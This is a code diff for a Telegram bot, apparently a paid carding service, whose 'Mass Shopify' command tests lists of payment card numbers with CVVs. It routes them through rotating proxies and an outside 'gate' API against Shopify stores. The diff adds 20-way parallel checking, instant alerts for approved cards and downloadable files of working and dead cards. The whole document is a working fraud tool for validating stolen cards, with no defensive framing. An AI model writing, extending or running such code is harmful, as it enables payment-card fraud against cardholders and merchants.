@@ -7,6 +7,7 @@ import signal
 import os
 import fcntl
 import json
+from io import BytesIO
 from html import escape
 from typing import Optional
 from datetime import datetime
@@ -664,6 +665,20 @@ def kb_result_raw(is_premium: bool = False) -> RawMarkup:
         [_btn("💎 " + B("BUY PREMIUM") + " — Unlimited Checks", cb="mprice", style="primary")],
         [_btn("📢 @Batcardchk", url=CHANNEL_LINK)],
     ])
+
+def kb_msh_result(task_id: str, has_approved: bool, is_premium: bool) -> RawMarkup:
+    """End-of-check keyboard: download buttons + optional upgrade row."""
+    rows = []
+    # Row 1: download buttons
+    dl_row = []
+    if has_approved:
+        dl_row.append(_btn("📄 Approved", cb=f"dl_approved_{task_id}", style="primary"))
+    dl_row.append(_btn("📋 ALL Cards", cb=f"dl_all_{task_id}"))
+    rows.append(dl_row)
+    # Row 2: upgrade nudge for trial users
+    if not is_premium:
+        rows.append([_btn("💎 " + B("BUY PREMIUM") + " — Unlimited", cb="mprice", style="primary")])
+    return RawMarkup(rows)
 
 def kb_fb_owner(key: str) -> RawMarkup:
     return RawMarkup([[
@@ -2150,7 +2165,9 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     live_count = dead_count = error_count = credits_used = 0
     stopped_no_credits = False
     start_time = time.time()
-    live_hits: list[str] = []
+    live_hits: list[str] = []      # formatted for inline display
+    live_hits_raw: list[str] = []  # plain cc|mm|yy|cvv for Approved file
+    all_checked_raw: list[str] = [] # every checked card with tag for ALL file
 
     task_id = f"msh_{user.id}_{int(start_time)}"
     context.bot_data.setdefault("msh_tasks", {})[task_id] = {"running": True}
@@ -2173,7 +2190,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML", reply_markup=stop_kb
     )
 
-    # Load sites and proxies
+    # ── Load sites and proxies ─────────────────────────────────────
     sites: list[str] = []
     proxies: list[str] = []
     try:
@@ -2189,82 +2206,161 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except FileNotFoundError:
         pass
 
-    GOSHOPI   = "https://goshopi.up.railway.app/shopii"
-    last_edit = time.time()
+    GOSHOPI = "https://goshopi.up.railway.app/shopii"
 
-    async def _progress_update():
-        nonlocal last_edit
-        if time.time() - last_edit < 3:
+    # ── Concurrency primitives ──────────────────────────────────────
+    # 20 parallel requests — fast without hammering the gate API
+    sem   = asyncio.Semaphore(20)
+    # Protects shared counters that multiple coroutines update
+    _lock = asyncio.Lock()
+
+    # ── Periodic progress reporter (runs every 3 s independently) ──
+    async def _progress_loop():
+        while True:
+            await asyncio.sleep(3)
+            checked = live_count + dead_count + error_count
+            elapsed = time.time() - start_time
+            rate    = checked / max(elapsed, 0.01)
+            try:
+                await msg.edit_text(
+                    f"<b>{E_PROGRESS} {B('Mass Shopify')}</b>\n──────────\n"
+                    f"<b>Checked:</b>  {checked}/{total}\n"
+                    f"<b>Live:</b>     {live_count} ✅\n"
+                    f"<b>Dead:</b>     {dead_count} ❌\n"
+                    f"<b>Errors:</b>   {error_count} ⚠️\n"
+                    f"──────────\n"
+                    f"<b>Speed:</b>    {rate:.1f} cc/s\n"
+                    f"<b>User:</b>     {escape(uname)}"
+                    f"{_cr_line()}",
+                    parse_mode="HTML", reply_markup=stop_kb
+                )
+            except Exception:
+                pass
+
+    # ── Per-card concurrent worker ──────────────────────────────────
+    async def _check_one(card: str, session: "_aiohttp.ClientSession") -> None:
+        nonlocal live_count, dead_count, error_count, credits_used, stopped_no_credits
+        # Fast pre-check before waiting for semaphore
+        if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
             return
-        last_edit = time.time()
-        checked = live_count + dead_count + error_count
-        elapsed = time.time() - start_time
-        rate    = checked / elapsed if elapsed > 0 else 0
-        try:
-            await msg.edit_text(
-                f"<b>{E_PROGRESS} {B('Mass Shopify')}</b>\n──────────\n"
-                f"<b>Checked:</b>  {checked}/{total}\n"
-                f"<b>Live:</b>     {live_count} ✅\n"
-                f"<b>Dead:</b>     {dead_count} ❌\n"
-                f"<b>Errors:</b>   {error_count} ⚠️\n"
-                f"──────────\n"
-                f"<b>Speed:</b>    {rate:.1f} cc/s\n"
-                f"<b>User:</b>     {escape(uname)}"
-                f"{_cr_line()}",
-                parse_mode="HTML", reply_markup=stop_kb
-            )
-        except Exception:
-            pass
-
-    async with _aiohttp.ClientSession(timeout=_aiohttp.ClientTimeout(total=30)) as session:
-        for card in cards:
-            # Stop button
-            if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
-                break
-            # Credit check before each card (trial users)
-            if is_trial and ud.get("credits", 0) <= 0:
+        if is_trial and ud.get("credits", 0) <= 0:
+            async with _lock:
                 stopped_no_credits = True
-                break
+            return
 
-            site  = random.choice(sites)
+        async with sem:
+            # Re-check inside semaphore (another worker may have stopped)
+            if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
+                return
+            if is_trial and ud.get("credits", 0) <= 0:
+                async with _lock:
+                    stopped_no_credits = True
+                return
+
+            site = random.choice(sites)
             for pfx in ("https://", "http://"):
-                if site.startswith(pfx): site = site[len(pfx):]
-            site  = site.rstrip("/")
+                if site.startswith(pfx):
+                    site = site[len(pfx):]
+            site = site.rstrip("/")
             proxy = random.choice(proxies) if proxies else None
             params: dict = {"cc": card, "site": site}
-            if proxy: params["proxy"] = proxy
+            if proxy:
+                params["proxy"] = proxy
+
+            resp_text = ""
             try:
-                async with session.get(GOSHOPI, params=params, timeout=_aiohttp.ClientTimeout(total=20)) as resp:
-                    try:    data = await resp.json(content_type=None)
-                    except: data = {"value": await resp.text()}
-                resp_text = ""
+                async with session.get(
+                    GOSHOPI, params=params,
+                    timeout=_aiohttp.ClientTimeout(total=15)
+                ) as resp:
+                    try:
+                        data = await resp.json(content_type=None)
+                    except Exception:
+                        data = {"value": await resp.text()}
                 for k in ("value", "message", "Response", "response", "category", "status"):
                     v = data.get(k)
                     if v and str(v).strip() not in ("", "null", "None"):
-                        resp_text = str(v).strip(); break
-                if not resp_text: resp_text = str(data)[:80]
+                        resp_text = str(v).strip()
+                        break
+                if not resp_text:
+                    resp_text = str(data)[:80]
+
                 low = resp_text.lower()
-                if any(w in low for w in ("approved", "captured", "success", "charged", "true", "live")):
-                    live_count += 1
-                    live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}")
-                elif any(w in low for w in ("declined", "failed", "invalid", "error", "insufficient")):
-                    dead_count += 1
-                else:
-                    error_count += 1
+                is_live = any(w in low for w in ("approved", "captured", "success", "charged", "true", "live"))
+                is_dead = any(w in low for w in ("declined", "failed", "invalid", "error", "insufficient"))
+
+                async with _lock:
+                    if is_live:
+                        live_count += 1
+                        live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}")
+                        live_hits_raw.append(card)
+                        all_checked_raw.append(f"[LIVE]  {card} | {resp_text[:60]}")
+                    elif is_dead:
+                        dead_count += 1
+                        all_checked_raw.append(f"[DEAD]  {card} | {resp_text[:60]}")
+                    else:
+                        error_count += 1
+                        all_checked_raw.append(f"[ERROR] {card}")
+                    if is_trial:
+                        ud["credits"] = max(0, ud.get("credits", 0) - 1)
+                        credits_used += 1
+
+                # ── Send live hit immediately to user's chat ──────────
+                if is_live:
+                    try:
+                        await update.message.reply_text(
+                            f"<b>✅ APPROVED #{live_count}</b>\n"
+                            f"──────────\n"
+                            f"<code>{escape(card)}</code>\n"
+                            f"<b>Response:</b> {escape(resp_text[:80])}\n"
+                            f"<b>Gate:</b> Shopify 0-20$",
+                            parse_mode="HTML"
+                        )
+                    except Exception:
+                        pass
+
             except Exception:
-                error_count += 1
+                async with _lock:
+                    error_count += 1
+                    all_checked_raw.append(f"[ERROR] {card}")
+                    if is_trial:
+                        ud["credits"] = max(0, ud.get("credits", 0) - 1)
+                        credits_used += 1
 
-            # Deduct 1 credit per card for trial users
-            if is_trial:
-                ud["credits"] = max(0, ud.get("credits", 0) - 1)
-                credits_used += 1
-
-            await _progress_update()
-            await asyncio.sleep(0.25)
+    # ── Run all workers concurrently ───────────────────────────────
+    progress_task = asyncio.create_task(_progress_loop())
+    connector = _aiohttp.TCPConnector(
+        limit=60,
+        ttl_dns_cache=300,
+        enable_cleanup_closed=True,
+        force_close=False,
+    )
+    try:
+        async with _aiohttp.ClientSession(
+            connector=connector,
+            timeout=_aiohttp.ClientTimeout(total=20),
+        ) as session:
+            await asyncio.gather(
+                *[asyncio.create_task(_check_one(card, session)) for card in cards],
+                return_exceptions=True,
+            )
+    finally:
+        progress_task.cancel()
+        try:
+            await progress_task
+        except asyncio.CancelledError:
+            pass
 
     context.bot_data.get("msh_tasks", {}).pop(task_id, None)
     elapsed = time.time() - start_time
     checked = live_count + dead_count + error_count
+
+    # ── Store results for download buttons (kept for 2 h) ─────────
+    context.bot_data.setdefault("msh_results", {})[task_id] = {
+        "approved": live_hits_raw,
+        "all":      all_checked_raw,
+        "ts":       time.time(),
+    }
 
     # Build trial footer
     if is_trial:
@@ -2295,17 +2391,11 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<b>Time:</b>     {elapsed:.1f}s\n"
             f"<b>User:</b>     {escape(uname)}"
             f"{trial_footer}",
-            parse_mode="HTML", reply_markup=kb_result_raw(premium)
+            parse_mode="HTML",
+            reply_markup=kb_msh_result(task_id, bool(live_hits_raw), premium)
         )
     except Exception:
         pass
-
-    if live_hits:
-        hits_msg = f"<b>{E_LIVE} {B('Live Hits')} ➳ {live_count}</b>\n──────────\n"
-        hits_msg += "\n".join(live_hits[:50])
-        if live_count > 50: hits_msg += f"\n...and {live_count - 50} more"
-        try: await update.message.reply_text(hits_msg, parse_mode="HTML")
-        except Exception: pass
 
     ud["total_checks"]    = ud.get("total_checks", 0) + checked
     ud["approved_checks"] = ud.get("approved_checks", 0) + live_count
@@ -2800,6 +2890,57 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("Task already finished.", show_alert=True)
         return
 
+    # ── Download Approved cards file ──────────────────────────────
+    if data.startswith("dl_approved_"):
+        task_id = data[len("dl_approved_"):]
+        results = context.bot_data.get("msh_results", {}).get(task_id)
+        if not results or not results.get("approved"):
+            await query.answer("No approved cards found or results expired.", show_alert=True)
+            return
+        await query.answer("Sending approved cards file…", show_alert=False)
+        content  = "\n".join(results["approved"]).encode("utf-8")
+        filename = f"approved_{task_id}.txt"
+        try:
+            await query.message.reply_document(
+                document=BytesIO(content),
+                filename=filename,
+                caption=(
+                    f"<b>✅ Approved Cards</b>\n"
+                    f"Total: <b>{len(results['approved'])}</b> cards\n"
+                    f"Gate: Shopify 0-20$"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+
+    # ── Download ALL cards file ───────────────────────────────────
+    if data.startswith("dl_all_"):
+        task_id = data[len("dl_all_"):]
+        results = context.bot_data.get("msh_results", {}).get(task_id)
+        if not results or not results.get("all"):
+            await query.answer("Results expired or not found.", show_alert=True)
+            return
+        await query.answer("Sending all results file…", show_alert=False)
+        content  = "\n".join(results["all"]).encode("utf-8")
+        filename = f"all_results_{task_id}.txt"
+        try:
+            await query.message.reply_document(
+                document=BytesIO(content),
+                filename=filename,
+                caption=(
+                    f"<b>📋 All Checked Cards</b>\n"
+                    f"Total: <b>{len(results['all'])}</b> cards\n"
+                    f"Gate: Shopify 0-20$\n"
+                    f"<i>[LIVE] = approved  [DEAD] = declined  [ERROR] = failed</i>"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+
     pay_map = {
         "pay10": ("Core",  10, 7,  "CORE"),
         "pay15": ("Elite", 15, 15, "ELITE"),
@@ -2954,27 +3095,29 @@ def main():
         return
 
     try:
-        # Regular API calls (send_message, etc.)
+        # Regular API calls (send_message, edit_message, etc.)
+        # Large pool so many users sending/receiving at the same time never queue
         _request = HTTPXRequest(
-            connection_pool_size=8,
-            connect_timeout=30.0,
+            connection_pool_size=64,
+            connect_timeout=10.0,
             read_timeout=30.0,
             write_timeout=30.0,
-            pool_timeout=30.0,
+            pool_timeout=60.0,
         )
-        # Long-poll getUpdates needs a much longer read_timeout
+        # Long-poll getUpdates — separate pool, generous read timeout
         _get_updates_request = HTTPXRequest(
-            connection_pool_size=4,
-            connect_timeout=30.0,
+            connection_pool_size=8,
+            connect_timeout=10.0,
             read_timeout=65.0,   # PTB polls for 30 s + 35 s buffer
             write_timeout=30.0,
-            pool_timeout=30.0,
+            pool_timeout=60.0,
         )
         app = (
             Application.builder()
             .token(BOT_TOKEN)
             .request(_request)
             .get_updates_request(_get_updates_request)
+            .concurrent_updates(512)   # handle 512 updates simultaneously
             .post_init(_post_init)
             .build()
         )
